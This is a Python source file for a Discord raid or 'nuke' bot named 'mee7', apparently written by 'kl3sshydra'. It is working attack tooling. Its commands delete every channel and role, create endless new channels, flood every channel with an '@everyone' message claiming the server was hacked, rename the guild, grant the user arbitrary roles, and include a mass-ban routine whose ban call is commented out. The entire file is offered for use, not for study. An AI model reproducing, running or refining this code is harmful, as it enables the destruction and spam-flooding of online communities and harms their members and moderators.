import discord
import os
import string    
import random  
import asyncio
import threading
from discord.utils import get


os.system('clear')


#######

customBot = True

if customBot == False:
  discordbot_ = os.getenv('token')
else:
  discordbot_ = input('Discord bot token: ')


consoleRaid_ = False

spamMSG = "@everyone https://t.me/kl3sshydra\nhttps://github.com/kl3sshydra\nhttps://bit.ly/TheKl3sshydra\nkl3sshydra hacked your discord server.\n\nkl3sshydra non perdona."


S = 20
ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))  
ran = str(ran)
guildname = ran

#######


client = discord.Client()

@client.event
async def on_ready():
  print("Welcome to mee7 coded by kl3sshydra")
  print(f'Logged in with {str(client.user)}')
  
  print("Guild list:")
  for guild in client.guilds:
      nomeguild = guild.name
      print("[+] "+nomeguild+" // "+str(guild.id))

  if consoleRaid_:
    print("\nIf you want to execute bot commands, go on the server you want to execute your commands in and type +help. if you want to raid a specific server in the guild list, insert it here.")
    server = input("-> ")
    print("\nDetecting server..")

    await consoleRaid(server)



async def delete_all_channel(guild):
    for channel in guild.channels:
        try:
            print("Deleting channel '"+str(channel)+"'")
            await channel.delete()
        except:
            continue
    S = 10
    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
    ran = str(ran)
    await guild.create_text_channel(ran)


async def clear(ctx, amount):
    await ctx.channel.purge(limit=amount)





async def send_all(guild, message, number):
    for channel in guild.channels:
      if channel != message.channel:
        print("Sending message to '"+str(channel)+"'")
        try:
          counter = 0
          while counter != int(number):
            await channel.send(spamMSG)
            counter = counter + 1
        except:
            continue


async def consoleSend(guild, number):
    for channel in guild.channels:
      print("Sending message to '"+str(channel)+"'")
      try:
        counter = 0
        while counter != int(number):
          await channel.send(spamMSG)
          counter = counter + 1
      except:
          continue


async def createChannels(message, number):
  counter = 0
  while counter != int(number):
    S = 5
    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
    ran = str(ran)
    guild = message.guild
    channelname = 'HYDRA-'+ran
    print("Creating channel '"+channelname+"'")
    await guild.create_text_channel(channelname)
    counter = counter+1


async def consoleRaid(server):

  detect = 0

  for guild in client.guilds:
    if str(guild.id) == server:
      detect = 1
      print("Detected '"+guild.name+"'")

      guild = discord.utils.get(client.guilds, name=server)

      print("Raiding..")
      for channel in guild.id.channels:
            try:
              print("Deleting channel '"+channel+"''")
              await channel.delete()
            except:
                continue

      while True:
        await createChannels(guild.id, 15)
        await consoleSend(guild.id, 2)
  

  if detect == 0:
    print("No server detected.\n\n")


async def updateprofilepicture(message, integer):
  
  photo = f"{str(integer)}.png"
  print("Updating profile picture with "+photo)

  try:
    with open(photo, 'rb') as f:
      icon = f.read()
    await message.guild.edit(icon=icon)
  except Exception as e:
    print(f"Error: {str(e)}")

  
  

async def raid(message, number, number_):
  print("Raiding..")

  for channel in message.guild.channels:
        try:
          if channel != message.channel:
            print("Deleting channel '"+channel+"''")
            await channel.delete()
        except:
            continue

  while True:
    await createChannels(message, number)
    await send_all(message.guild, message, number_)


async def delete_all_roles(guild):
    for role in guild.roles:
        try:
            print("Deleting role "+ role)
            await role.delete()
        except:
            continue

async def massrole(ctx, amount):
  counter = 0
  while counter != amount:
    guild = ctx.guild
    S = 5
    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
    ran = str(ran)
    await guild.create_role(name=ran)
    counter = counter + 1

async def massban(ctx):
   for user in ctx.guild.members:
    try:
      #await user.ban()
      print(user)
    except:
      pass


async def simpleraid(message, amount):
  print("Starting simple raid...")
  for x in range(amount):
    print("Sending message number: "+str(x))
    if str(x/10).split('.')[1] == "5":
      print("Sleeping..")
      await asyncio.sleep(2)
      print("Continuing..")
    await message.channel.send(spamMSG)


@client.event
async def on_message(message):

  if str(message.content) != spamMSG:
    print(f"[{str(message.guild)}]-({str(message.author)}): {str(message.content)}")


  if message.author == client.user:
    return

  if message.content.startswith('+raid'):
    number = message.content.split(' ')[1]
    number_ = message.content.split(' ')[2]
    await clear(message, 10)
    S = 5
    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))   
    ran = str(ran)
    await message.guild.edit(name=guildname)
    await raid(message, number, number_)

  if message.content.startswith('+delete_channels'):
    await clear(message, 1)
    await delete_all_channel(message.guild)

  if message.content.startswith('+massban'):
    await clear(message, 1)
    await massban(message)

  if message.content.startswith('+bye'):
    await clear(message, 1)
    print("Quiting because "+str(message.author)+" said to.")
    exit()
    

  if message.content.startswith('+massrole'):
    await clear(message, 1)
    amount_ = message.content.split(' ')[1]
    try:
      amount_ = int(amount_)
    except:
      amount_ = 10
    await massrole(message, amount_)

  if message.content.startswith('+delete_roles'):
    await clear(message, 1)
    await delete_all_roles(message.guild)

  
  if message.content.startswith('+role'):
    rolename = message.content.split(' ')[1]

    await clear(message, 1)
    member = message.author
    role = get(message.guild.roles, name=rolename)
    await member.add_roles(role)


  if message.content.startswith('+simple'):
    try:
      amount = message.content.split(' ')[1]
      amount = int(amount)
    except:
      amount = 1
    await simpleraid(message, amount)
  

  if message.content.startswith('+pic'):
    integer = message.content.split(' ')[1]

    await clear(message, 1)
    await updateprofilepicture(message, integer)


  if message.content.startswith('+cls'):
    amount_ = message.content.split(' ')[1]
    try:
      amount_ = int(amount_)
    except:
      amount_ = 10
    await clear(message, amount_)

  if message.content.startswith('-ping'):    
    await message.channel.send(f"Ping: {client.latency}")
    await asyncio.sleep(1)
    await clear(message, 2)


  if message.content.startswith('+help'):
    await message.channel.send("""
**+delete_channels** ->  _deletes all channels._
**+delete_roles** ->  _deletes all roles._
**+massrole [amount]** -> _creates tons of roles._
**+raid [channels] [amount]** ->  _raids the entire server._
**+massban** -> _bans the entire server._
**+role [name]** -> _gives yourself a role._
**+cls [amount]** ->  _clears channel._
**+bye* ->  _quits._
**+pic [number]** ->  _updates guild picture._
**+simple** ->  _spams only one channel._
    """)

  
client.run(discordbot_)




